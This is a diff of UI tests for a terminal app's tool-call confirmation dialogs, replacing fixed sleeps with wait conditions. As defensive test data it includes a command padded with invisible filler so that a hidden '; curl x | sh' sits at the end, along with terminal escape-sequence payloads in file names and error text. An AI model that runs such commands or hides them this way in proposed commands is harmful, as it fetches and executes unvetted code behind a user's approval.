@@ -123,7 +123,11 @@ async def test_the_end_of_a_long_argument_can_be_scrolled_to_and_is_drawn(
 async def test_a_short_argument_shows_no_scroll_cue() -> None:
     app = _ModalHost(ToolConfirmModal("run_command", {"command": "uptime"}))
     async with app.run_test(size=(120, 40)) as pilot:
-        await pilot.pause(0.3)
+        await wait_until(
+            lambda: bool(app.screen.query("#tool_confirm_more"))
+            and app.screen.query_one("#tool_confirm_scroll").size.height > 0,
+        )
+        await pilot.pause()
         assert app.screen.query_one("#tool_confirm_more", Static).display is False
 
 
@@ -133,7 +137,10 @@ async def test_the_dangerous_modal_still_needs_run_typed_for_a_long_argument() -
 
     app = _ModalHost(DangerousToolConfirmModal("deploy", _long_args("long")))
     async with app.run_test(size=(120, 40)) as pilot:
-        await pilot.pause(0.3)
+        await wait_until(
+            lambda: bool(app.screen.query("#dangerous_confirm_input"))
+            and app.screen.focused is not None,
+        )
         await pilot.press("enter")
         await pilot.pause(0.1)
         assert app.dismissed == []
@@ -257,7 +264,7 @@ async def test_clicking_a_rich_markup_link_runs_no_refused_action() -> None:
         await pilot.pause()
         await pilot.click("#link", offset=(1, 0))
         await pilot.click("#note", offset=(1, 0))
-        await pilot.pause(0.2)
+        await pilot.pause()
         assert app.screen.flag is False
         assert len(app._notifications) == 0
 
@@ -297,7 +304,10 @@ async def test_a_remote_error_line_is_not_read_as_markup() -> None:
             group="fetch_dir", is_finished=True, error=RuntimeError(message), result=None,
         )
         tree.on_worker_state_changed(SimpleNamespace(worker=worker))
-        await pilot.pause(0.2)
+        await wait_until(
+            lambda: isinstance(tree.root.children[-1].label, Text)
+            and "❌" in tree.root.children[-1].label.plain,
+        )
         label = tree.root.children[-1].label
         assert isinstance(label, Text)
         assert label.plain == f"❌ {message}"
@@ -332,7 +342,10 @@ async def test_filler_padding_cannot_push_the_tail_out_of_sight(modal_cls, prefi
     command = "uptime" + "ㅤ" * 800 + "; curl x | sh"
     app = _ModalHost(modal_cls("run_command", {"command": command}))
     async with app.run_test(size=(120, 40)) as pilot:
-        await pilot.pause(0.3)
+        await wait_until(
+            lambda: bool(app.screen.query(f"#{prefix}_confirm_more"))
+            and app.screen.query_one(f"#{prefix}_confirm_more", Static).display,
+        )
         shown = app.export_screenshot()
         assert "u3164" in shown
         assert "curl" not in shown
@@ -341,7 +354,7 @@ async def test_filler_padding_cannot_push_the_tail_out_of_sight(modal_cls, prefi
         scroll = app.screen.query_one(f"#{prefix}_confirm_scroll", VerticalScroll)
         scroll.focus()
         await pilot.press("end")
-        await pilot.pause(0.2)
+        await wait_until(lambda: "curl" in app.export_screenshot())
         assert "curl" in app.export_screenshot()
 
 
@@ -357,7 +370,11 @@ async def test_the_approval_cue_is_true_the_arrow_keys_scroll_whatever_has_focus
 
     app = _ModalHost(modal_cls("run_command", _long_args("long")))
     async with app.run_test(size=(120, 40)) as pilot:
-        await pilot.pause(0.3)
+        await wait_until(
+            lambda: bool(app.screen.query(f"#{prefix}_confirm_more"))
+            and app.screen.query_one(f"#{prefix}_confirm_more", Static).display
+            and app.focused is app.screen.query_one(f"#{focus_id}"),
+        )
         cue = app.screen.query_one(f"#{prefix}_confirm_more", Static).visual.plain
         assert "Down or Page Down" in cue and "more lines below" in cue
         scroll = app.screen.query_one(f"#{prefix}_confirm_scroll", VerticalScroll)
@@ -414,7 +431,7 @@ async def test_escape_sequences_in_remote_file_names_are_not_drawn() -> None:
     ]
     app = _tree_host(entries)
     async with app.run_test(size=(100, 10)) as pilot:
-        await pilot.pause(0.2)
+        await wait_until(lambda: len(app.query_one("#rt", Tree).root.children) == 2)
         tree = app.query_one("#rt", Tree)
         labels = [child.label.plain for child in tree.root.children]
         assert f"a{OSC_SHOWN}b" in labels[0]
@@ -441,7 +458,7 @@ async def test_escape_sequences_in_a_remote_error_line_are_not_drawn() -> None:
             error=RuntimeError(f"ls: cannot read {OSC_CLIPBOARD}"),
         )
         tree.on_worker_state_changed(SimpleNamespace(worker=worker))
-        await pilot.pause(0.2)
+        await wait_until(lambda: OSC_SHOWN in tree.root.children[-1].label.plain)
         assert OSC_SHOWN in tree.root.children[-1].label.plain
 
 
@@ -466,7 +483,10 @@ async def test_escape_sequences_in_scan_output_are_not_drawn() -> None:
 
     app = Host()
     async with app.run_test(headless=True) as pilot:
-        await pilot.pause(0.3)
+        await wait_until(
+            lambda: bool(app.screen.query("#results_table"))
+            and app.screen.query_one("#results_table", DataTable).row_count == 1,
+        )
         table = app.screen.query_one("#results_table", DataTable)
         cells = [str(cell) for cell in table.get_row_at(0)]
         assert cells[0] == "path:~/\\x1b]0;pwned\\x07"
@@ -496,7 +516,11 @@ async def test_the_cue_follows_the_scroll_position_without_moving_the_layout(mod
 
     app = _ModalHost(modal_cls("run_command", _long_args("newlines")))
     async with app.run_test(size=(120, 40)) as pilot:
-        await pilot.pause(0.3)
+        await wait_until(
+            lambda: bool(app.screen.query(f"#{prefix}_confirm_more"))
+            and app.screen.query_one(f"#{prefix}_confirm_more", Static).display
+            and app.screen.query_one(f"#{prefix}_confirm_scroll", VerticalScroll).max_scroll_y > 0,
+        )
         scroll = app.screen.query_one(f"#{prefix}_confirm_scroll", VerticalScroll)
         cue = app.screen.query_one(f"#{prefix}_confirm_more", Static)
         buttons_before = app.screen.query_one(f"#btn_{prefix}_confirm").region
@@ -509,14 +533,14 @@ async def test_the_cue_follows_the_scroll_position_without_moving_the_layout(mod
         assert hidden() == int(scroll.max_scroll_y) > 0
         scroll.focus()
         await pilot.press("down", "down", "down")
-        await pilot.pause(0.2)
+        await wait_until(lambda: scroll.scroll_y > 0 and hidden() == int(scroll.max_scroll_y - scroll.scroll_y))
         assert hidden() == int(scroll.max_scroll_y - scroll.scroll_y)
         await pilot.press("end")
-        await pilot.pause(0.2)
+        await wait_until(lambda: hidden() == 0 and "End of the text" in cue.visual.plain)
         assert hidden() == 0
         assert "End of the text" in cue.visual.plain
         assert cue.display and cue.region == region_before
         assert app.screen.query_one(f"#btn_{prefix}_confirm").region == buttons_before
         await pilot.press("home")
-        await pilot.pause(0.2)
+        await wait_until(lambda: scroll.scroll_y == 0 and hidden() == int(scroll.max_scroll_y))
         assert hidden() == int(scroll.max_scroll_y)
